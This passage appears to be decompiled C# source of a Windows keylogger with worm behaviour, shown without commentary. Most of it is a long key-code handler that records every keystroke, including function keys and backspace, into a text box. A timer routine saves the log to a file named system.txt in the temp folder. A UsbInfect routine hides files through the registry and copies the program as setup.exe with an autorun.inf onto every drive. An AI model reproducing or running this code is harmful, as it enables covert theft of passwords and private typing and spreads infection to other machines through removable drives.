				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		if (sent == 0)
		{
			Timer1.Stop();
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", TextBox1.get_Text(), false);
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", (FileAttribute)0);
			Timer1.Start();
		}
		if (sent == 1)
		{
			Timer1.Stop();
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", TextBox1.get_Text(), true);
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", (FileAttribute)0);
			Timer1.Start();
		}
	}

	public void UsbInfect()
	{
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!programFiles.Contains(text) && !((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text + "setup.exe"))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "setup.exe", true);
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "setup.exe\r\nshellexecute=" + text, true);
					FileSystem.SetAttr(text + "setup.exe", (FileAttribute)0);
					FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
